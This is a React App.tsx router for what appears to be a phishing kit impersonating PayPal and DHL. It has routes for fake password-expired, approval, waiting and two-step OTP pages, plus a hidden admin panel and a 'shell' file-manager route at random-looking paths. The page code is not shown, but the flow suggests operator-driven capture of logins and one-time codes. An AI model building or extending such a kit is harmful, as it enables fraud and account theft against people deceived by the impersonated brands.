import { Switch, Route, Link } from "wouter";
import { queryClient } from "./lib/queryClient";
import { QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/not-found";
import HomePage from "@/pages/HomePage";
import PayPalPage from "@/pages/PayPalPage";
import PayPalWaitingPage from "@/pages/PayPalWaitingPage";
import PayPalApprovePage from "@/pages/PayPalApprovePage";
import PayPalPasswordExpiredPage from "@/pages/PayPalPasswordExpiredPage";
import PayPalOTPPage from "@/pages/PayPalOTPPage";
import PayPalFailurePage from "@/pages/PayPalFailurePage";
import PayPalSuccessPage from "@/pages/PayPalSuccessPage";
import DHLWaitingPage from "@/pages/DHLWaitingPage";
import DHLApprovePage from "@/pages/DHLApprovePage";
import DHLOTPPage from "@/pages/DHLOTPPage";
import DHLErrorPage from "@/pages/DHLErrorPage";
import DHLOTPErrorPage from "@/pages/DHLOTPErrorPage";
import DHLSuccessPage from "@/pages/DHLSuccessPage";
import AdminPage from "@/pages/AdminPage";
import FileManagerPage from "@/pages/FileManagerPage";

function Router() {
  const urlParams = new URLSearchParams(window.location.search);
  const paymentId = urlParams.get("paymentId") || localStorage.getItem("dhlPaymentId") || "";

  return (
    <Switch>
      <Route path="/" component={HomePage} />
      <Route path="/paypal" component={PayPalPage} />
      <Route path="/paypal/waiting" component={PayPalWaitingPage} />
      <Route path="/paypal/approve" component={PayPalApprovePage} />
      <Route path="/paypal/password-expired" component={PayPalPasswordExpiredPage} />
      <Route path="/paypal/otp">
        {() => <PayPalOTPPage step={1} />}
      </Route>
      <Route path="/paypal/otp1">
        {() => <PayPalOTPPage step={1} />}
      </Route>
      <Route path="/paypal/otp2">
        {() => <PayPalOTPPage step={2} />}
      </Route>
      <Route path="/paypal/success" component={PayPalSuccessPage} />
      <Route path="/paypal/failure" component={PayPalFailurePage} />
      <Route path="/dhl/waiting" component={DHLWaitingPage} />
      <Route path="/approve" component={DHLApprovePage} />
      <Route path="/otp1">
        {() => <DHLOTPPage step={1} paymentId={paymentId} />}
      </Route>
      <Route path="/otp2">
        {() => <DHLOTPPage step={2} paymentId={paymentId} />}
      </Route>
      <Route path="/error" component={DHLErrorPage} />
      <Route path="/otp-error" component={DHLOTPErrorPage} />
      <Route path="/success" component={DHLSuccessPage} />
      <Route path="/panel-x7k9m2n5" component={AdminPage} />
      <Route path="/shell-f8m3p1q6" component={FileManagerPage} />
      <Route component={NotFound} />
    </Switch>
  );
}

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <Router />
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
